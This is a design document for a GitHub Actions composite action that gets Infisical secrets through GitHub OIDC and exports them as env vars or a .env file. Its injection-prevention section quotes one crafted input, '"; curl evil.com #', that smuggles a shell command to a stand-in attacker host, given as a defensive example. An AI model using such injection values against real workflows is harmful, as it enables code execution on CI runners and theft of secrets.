# Get Infisical Secrets — Composite Action Design

## Summary

A self-contained GitHub Actions composite action that authenticates to Infisical via GitHub OIDC and exports secrets as environment variables or a `.env` file. No external action dependencies — only `curl`, `jq`, and `openssl`.

## Motivation

- The existing `Infisical/secrets-action@v1.0.15` is outdated and at risk of breaking
- Nethermind has multiple teams, each with their own Infisical machine identity
- Need a centralized, maintainable action in `NethermindEth/github-workflows` that all repos can use

## Inputs

| Input | Required | Default | Description |
|---|---|---|---|
| `identity-id` | yes | — | Infisical machine identity ID for OIDC auth |
| `project-id` | yes | — | Infisical project ID |
| `env-slug` | yes | — | Environment slug (`dev`, `staging`, `prod`) |
| `export-type` | no | `env` | `env` (env vars) or `file` (.env file) |
| `file-path` | no | `.env` | Output file path relative to `$GITHUB_WORKSPACE` (only used when `export-type` is `file`) |
| `domain` | no | `https://app.infisical.com` | Infisical instance URL |
| `secret-path` | no | — | Override the secret path (default derives from repo name as `/github/workflows/<repo-name>`) |

## Secret Path Convention

The secret path defaults to `/github/workflows/<repo-name>`, derived from `GITHUB_REPOSITORY`:

```bash
REPO_NAME="${GITHUB_REPOSITORY##*/}"
SECRET_PATH="/github/workflows/${REPO_NAME}"
```

For example, repo `NethermindEth/nethermind-node` fetches secrets from `/github/workflows/nethermind-node`.

Can be overridden with the `secret-path` input for custom paths.

## Authentication Flow

1. **Get GitHub OIDC token** — `curl` to `$ACTIONS_ID_TOKEN_REQUEST_URL` with header `Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN`. GitHub generates the token with default audience `https://github.com/NethermindEth`. The response is JSON; extract the token from the `value` field.
2. **Authenticate with Infisical** — `POST /api/v1/auth/oidc-auth/login` with form-encoded body `identityId=<identity-id>&jwt=<oidc-token>`.
3. **Receive bearer token** — Infisical returns JSON with `accessToken`.

## Secret Retrieval

4. **Fetch secrets** — `GET /api/v4/secrets` with:
   - `Authorization: Bearer <accessToken>`
   - `projectId=<project-id>`
   - `environment=<env-slug>`
   - `secretPath=<secret-path>`
   - `includeImports=true`
   - `expandSecretReferences=true`

## Export

5. **Mask all secret values** (both export modes):
   - For each line of each secret value, print `::add-mask::<line>` to stdout
   - Multiline values (e.g., private keys) are masked line-by-line since `::add-mask::` only works with single-line values
   - Note: GitHub silently ignores masking for values shorter than 4 characters

6. **If `export-type` is `env`** (default):
   - Write each secret to `$GITHUB_ENV` using heredoc delimiter format to handle multiline values:
     ```
     KEY<<GHEOF_<random>
     value
     GHEOF_<random>
     ```

7. **If `export-type` is `file`**:
   - Write secrets to `$GITHUB_WORKSPACE/<file-path>`
   - Use double-quoted values with proper escaping (backslash `\`, double-quote `"`, dollar `$`, backtick `` ` ``, newlines) to handle special characters

## Secret Processing Safety

### Input injection prevention

All `${{ inputs.* }}` expressions are passed via the step's `env:` block as `INPUT_*` environment variables, never inline in the `run:` block. The script references `${INPUT_IDENTITY_ID}`, `${INPUT_DOMAIN}`, etc. This prevents code injection — `${{ inputs.* }}` is substituted by GitHub before the shell runs, so a crafted input like `"; curl evil.com #` would execute as code if placed inline. Environment variables are safely expanded by the shell without code execution.

### Value leakage prevention

All secret parsing uses file-based I/O to prevent value leakage:
- `jq` reads directly from temp files, never via `echo` piping through shell variables
- `{ set +x; } 2>/dev/null` disables bash tracing before any secret processing. The redirect to `/dev/null` suppresses the `set +x` trace line itself, which bash would otherwise print as `+ set +x`
- Temp files use `mktemp -d` with `trap` cleanup on any exit
- No secret values pass through stdout at any point during parsing
- `::add-mask::` is applied line-by-line, not per-value, because GitHub's masking only works with single-line strings. Passing a multiline value (e.g., a private key) to `::add-mask::` causes all lines after the first to leak into the log as raw output

### Why not `export-type: output`?

We considered exporting secrets as step outputs (`$GITHUB_OUTPUT`) instead of environment variables (`$GITHUB_ENV`). Step outputs don't appear in the env var listings of subsequent steps, which would be cleaner from a security perspective.

However, **composite actions cannot expose dynamic outputs**. Outputs must be declared statically in `action.yml`, and since we don't know the secret key names in advance, there's no way to declare them. The internal step writes to `$GITHUB_OUTPUT`, but those values are not accessible to the caller via `${{ steps.<id>.outputs.<key> }}` unless the composite action declares each output explicitly.

For this reason, the default export type is `env`. The values are masked (showing as `***` in env listings) but the key names are visible.

## Import Handling

Infisical supports secret imports (secrets inherited from other paths/projects). The API returns these in the `imports` array. Imported secrets are included but do **not** override direct secrets — direct secrets take precedence.

## Error Handling

The action fails fast with clear error messages:

| Failure | Cause | Message |
|---|---|---|
| OIDC token request fails | Missing `id-token: write` permission, or `ACTIONS_ID_TOKEN_REQUEST_URL` not set | `Failed to get GitHub OIDC token. Ensure the job has 'permissions: id-token: write'.` |
| Infisical login returns 401/403 | Wrong identity ID or repo not allowed by OIDC binding | `Infisical authentication failed: <error message from API>` |
| Secret fetch returns 404 | Wrong project ID, environment, or secret path | `Failed to fetch secrets: <error message from API>` |
| Secret fetch returns empty | No secrets at the derived path | `No secrets found at path /<path> in project <project-id>, environment <env-slug>.` |
| `jq` parse error | Unexpected API response format | `Failed to parse Infisical API response.` |

All API error responses include a `message` field — surface it in the action output. The action exits with code 1 on any failure.

## Security

### OIDC Authentication
- Infisical machine identity configured with `bound_audiences = ["https://github.com/NethermindEth"]`
- `bound_claims.repository` restricts to specific repos using comma-separated exact values (e.g., `NethermindEth/repo-a, NethermindEth/repo-b`)
- One machine identity per Infisical project, auto-generated from `github.repositories` in project YAML

### Caller requirements
- Workflow must declare `permissions: id-token: write` for OIDC to work
- `identity-id` and `project-id` stored as GitHub repo secrets (set via Terraform or manually)

### Infisical permissions
- Machine identity has read-only access to `/github/workflows/**`
- `/github/workflows_critical/**` is denied for global devops/developer roles
- Critical project folders scoped to their specific groups via workflow-level roles

### Secret masking
- All secret values are masked line-by-line in GitHub Actions logs via `::add-mask::`
- Values shorter than 4 characters are silently ignored by GitHub (platform limitation)
- Multiline values (e.g., private keys) have each line masked individually

## Dependencies

- `curl` — pre-installed on all GitHub-hosted runners
- `jq` — pre-installed on all GitHub-hosted runners
- `openssl` — pre-installed on all GitHub-hosted runners (used for random delimiter generation)
- Common Unix utilities: `mktemp`, `grep`, `dirname`, `chmod` (assumed present on GitHub-hosted Ubuntu runners)
- No Node.js, no external GitHub Actions

## Infrastructure Prerequisites

- **Infisical**: Machine identity per project with OIDC auth, managed by `terraform-saas-infisical` module
- **GitHub**: `INFISICAL_IDENTITY_ID` and `INFISICAL_PROJECT_ID` repo secrets

## Caller Usage

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: NethermindEth/github-workflows/get_infisical_secrets@stable
    with:
      identity-id: ${{ secrets.INFISICAL_IDENTITY_ID }}
      project-id: ${{ secrets.INFISICAL_PROJECT_ID }}
      env-slug: dev

  - name: Use secrets
    run: echo "Secrets are now available as env vars"
```

### Custom secret path

```yaml
steps:
  - uses: NethermindEth/github-workflows/get_infisical_secrets@stable
    with:
      identity-id: ${{ secrets.INFISICAL_IDENTITY_ID }}
      project-id: ${{ secrets.INFISICAL_PROJECT_ID }}
      env-slug: prod
      secret-path: "/github/workflows/terragrunt"
```

### File export

```yaml
steps:
  - uses: NethermindEth/github-workflows/get_infisical_secrets@stable
    with:
      identity-id: ${{ secrets.INFISICAL_IDENTITY_ID }}
      project-id: ${{ secrets.INFISICAL_PROJECT_ID }}
      env-slug: dev
      export-type: file
      file-path: src/.env

  - name: Use secrets file
    run: echo "Secrets file created at src/.env"  # do not print file contents to logs
```

## File Location

```
get_infisical_secrets/action.yml
```
